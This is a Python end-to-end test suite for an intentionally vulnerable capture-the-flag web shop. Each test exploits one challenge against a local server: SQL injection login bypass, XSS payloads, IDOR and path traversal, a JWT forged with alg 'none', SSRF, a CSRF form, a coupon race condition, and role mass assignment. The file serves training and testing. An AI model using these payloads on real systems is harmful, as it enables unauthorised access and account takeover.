"""End-to-end tests: boot the real server, exploit every challenge over HTTP.

One test per challenge, plus scaffolding checks. Each test class gets a fresh
database, so balances and order ids never leak between tests.
"""
from __future__ import annotations

import base64
import json
import threading
import unittest
import urllib.error
import urllib.parse
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor
from http.cookiejar import CookieJar
from pathlib import Path
from typing import NamedTuple

from brokenshop import store
from brokenshop.app import create_server

SCRATCH = Path(__file__).resolve().parent / ".scratch"


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


class Resp(NamedTuple):
    status: int
    body: str
    location: str | None = None


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Keep 3xx responses visible so tests can assert on Location."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: D102
        return None


class Client:
    """A tiny browser: keeps cookies, never raises on 4xx/5xx."""

    def __init__(self, base: str) -> None:
        self.base = base
        self.jar = CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar), _NoRedirect()
        )

    def _do(self, request: urllib.request.Request) -> Resp:
        try:
            with self.opener.open(request, timeout=10) as response:
                return Resp(response.status, response.read().decode("utf-8", "replace"),
                            response.headers.get("Location"))
        except urllib.error.HTTPError as exc:
            return Resp(exc.code, exc.read().decode("utf-8", "replace"),
                        exc.headers.get("Location") if exc.headers else None)

    def get(self, path: str) -> Resp:
        return self._do(urllib.request.Request(self.base + path))

    def post(self, path: str, data: dict[str, str]) -> Resp:
        payload = urllib.parse.urlencode(data).encode()
        return self._do(urllib.request.Request(self.base + path, data=payload))


class ShopTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        SCRATCH.mkdir(exist_ok=True)
        cls.db = SCRATCH / f"shop-{uuid.uuid4().hex[:8]}.db"
        cls.server = create_server("127.0.0.1", 0, cls.db)
        cls.port = cls.server.server_port
        cls.base = f"http://127.0.0.1:{cls.port}"
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.server.shutdown()
        cls.server.server_close()
        for suffix in ("", "-wal", "-shm"):
            leftover = Path(str(cls.db) + suffix)
            if leftover.exists():
                leftover.unlink()

    def login(self, username: str, password: str = "password123") -> Client:
        browser = Client(self.base)
        response = browser.post("/login", {"username": username, "password": password})
        self.assertEqual(response.status, 303, "login should redirect")
        return browser


class TestScaffolding(ShopTestCase):
    def test_home_loads(self):
        response = Client(self.base).get("/")
        self.assertEqual(response.status, 200)
        self.assertIn("Rubber Duck", response.body)

    def test_unknown_route_is_404(self):
        self.assertEqual(Client(self.base).get("/nope").status, 404)

    def test_wrong_password_rejected(self):
        response = Client(self.base).post("/login", {"username": "alice", "password": "bad"})
        self.assertEqual(response.status, 401)

    def test_admin_requires_admin(self):
        self.assertEqual(self.login("alice").get("/admin").status, 403)

    def test_wrong_method_is_405(self):
        self.assertEqual(Client(self.base).get("/buy").status, 405)


class TestChallenge1SQLi(ShopTestCase):
    def test_or_comment_bypass(self):
        browser = Client(self.base)
        response = browser.post("/login", {"username": "admin' -- ", "password": "anything"})
        self.assertEqual(response.status, 303)
        admin = browser.get("/admin")
        self.assertEqual(admin.status, 200)
        self.assertIn(store.FLAGS["sqli"], admin.body)


class TestChallenge2XSS(ShopTestCase):
    def test_reflected_is_unescaped(self):
        body = Client(self.base).get("/?q=<script>alert(1)</script>").body
        self.assertIn("<script>alert(1)</script>", body)

    def test_stored_is_unescaped(self):
        browser = self.login("bob", "hunter2")
        payload = "<img src=x onerror=alert(1)>"
        browser.post("/reviews", {"body": payload})
        self.assertIn(payload, browser.get("/reviews").body)


class TestChallenge3IDOR(ShopTestCase):
    def test_read_other_users_order(self):
        self.assertIn(store.FLAGS["idor"], self.login("alice").get("/orders/2").body)

    def test_path_traversal(self):
        body = Client(self.base).get("/download?file=../secret/flag.txt").body
        self.assertIn(store.FLAGS["traversal"], body)


class TestChallenge4JWT(ShopTestCase):
    def test_alg_none_is_accepted(self):
        header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
        token = f"{header}.{payload}."
        response = Client(self.base).get(f"/api/admin?token={urllib.parse.quote(token)}")
        self.assertEqual(response.status, 200)
        self.assertIn(store.FLAGS["jwt"], response.body)

    def test_signed_user_token_is_rejected(self):
        token = json.loads(self.login("alice").get("/api/token").body)["token"]
        response = Client(self.base).get(f"/api/admin?token={urllib.parse.quote(token)}")
        self.assertEqual(response.status, 403)


class TestChallenge5SSRF(ShopTestCase):
    def test_fetch_internal_endpoint(self):
        target = urllib.parse.quote(f"{self.base}/internal/flag", safe="")
        response = Client(self.base).get(f"/fetch?url={target}")
        self.assertEqual(response.status, 200)
        self.assertIn(store.FLAGS["ssrf"], response.body)

    def test_non_http_scheme_refused(self):
        response = Client(self.base).get("/fetch?url=file:///etc/passwd")
        self.assertEqual(response.status, 400)


class TestChallenge6CSRF(ShopTestCase):
    def test_bot_sends_coins_then_buy_platinum(self):
        attacker = self.login("alice")
        page = (
            "<form action='/admin/gift' method='post'>"
            "<input name='to' value='alice'>"
            "<input name='amount' value='1000'>"
            "</form>"
        )
        upload = attacker.post("/upload", {"html": page})
        self.assertEqual(upload.status, 200)
        upload_path = upload.body.split('id="upload-link" href="')[1].split('"')[0]

        report = attacker.post("/report", {"url": upload_path})
        self.assertEqual(report.status, 200)
        self.assertIn("submitted form", report.body)

        self.assertIn("coins: <b>1100</b>", attacker.get("/account").body)

        buy = attacker.post("/buy", {"id": "3"})
        self.assertEqual(buy.status, 303)
        self.assertIsNotNone(buy.location)
        self.assertIn(store.FLAGS["csrf"], attacker.get(buy.location).body)


class TestChallenge7Race(ShopTestCase):
    def test_parallel_redeem_beats_the_check(self):
        browser = self.login("bob", "hunter2")
        self.assertIn("coins: <b>100</b>", browser.get("/account").body)

        def redeem(_i: int) -> int:
            return browser.post("/redeem", {}).status

        with ThreadPoolExecutor(max_workers=12) as pool:
            statuses = list(pool.map(redeem, range(12)))

        self.assertGreaterEqual(
            sum(1 for status in statuses if status == 200), 2,
            "the coupon should be redeemable more than once under concurrency",
        )
        self.assertNotIn("coins: <b>100</b>", browser.get("/account").body)

        buy = browser.post("/buy", {"id": "2"})
        self.assertEqual(buy.status, 303)
        self.assertIsNotNone(buy.location)
        self.assertIn(store.FLAGS["race"], browser.get(buy.location).body)


class TestChallenge8MassAssignment(ShopTestCase):
    def test_role_field_escalates(self):
        browser = self.login("alice")
        browser.post("/account", {"role": "admin"})
        admin = browser.get("/admin")
        self.assertEqual(admin.status, 200)
        self.assertIn(store.FLAGS["massassign"], admin.body)


if __name__ == "__main__":
    unittest.main()
